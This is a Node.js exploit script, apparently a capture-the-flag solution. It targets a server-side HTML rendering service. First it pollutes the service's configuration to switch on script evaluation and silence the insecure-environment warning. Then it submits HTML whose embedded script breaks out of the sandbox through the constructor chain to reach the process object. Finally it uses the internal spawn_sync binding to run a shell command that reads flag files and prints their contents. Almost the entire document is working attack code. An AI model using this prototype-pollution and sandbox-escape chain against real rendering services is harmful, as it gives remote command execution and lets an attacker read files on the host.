#!/usr/bin/env node

const base = (process.argv[2] || 'http://challenges2.ctf.sd:33295').replace(/\/+$/, '');

async function post(path, body) {
  const res = await fetch(`${base}${path}`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify(body)
  });

  const text = await res.text();
  if (!res.ok) {
    throw new Error(`${path} -> ${res.status}: ${text}`);
  }
  return text;
}

(async () => {
  const config = {
    a: '[Circular (constructor.prototype)]',
    'a.settings.enableJavaScriptEvaluation': true,
    'a.settings.suppressInsecureJavaScriptEnvironmentWarning': true
  };

  await post('/config', config);

  const html = `<!doctype html><html><body>
<script>
const p = this.constructor.constructor('return process')();
const spawn = p.binding('spawn_sync').spawn;
const envPairs = Object.entries(p.env).map(([k, v]) => \`\${k}=\${v}\`);
const result = spawn({
  file: '/bin/sh',
  args: ['sh', '-c', 'cat /flag_*.txt'],
  cwd: null,
  envPairs,
  stdio: [
    { type: 'pipe', readable: true, writable: false },
    { type: 'pipe', readable: false, writable: true },
    { type: 'pipe', readable: false, writable: true }
  ],
  windowsHide: false,
  windowsVerbatimArguments: false
});
const out = result.output && result.output[1] ? result.output[1].toString() : '';
document.body.textContent = out;
</script>
</body></html>`;

  const rendered = await post('/render', { html });
  const match = rendered.match(/<body[^>]*>([\s\S]*?)<\/body>/i);
  console.log(match ? match[1].trim() : rendered.trim());
})().catch((err) => {
  console.error(err.message || err);
  process.exit(1);
});
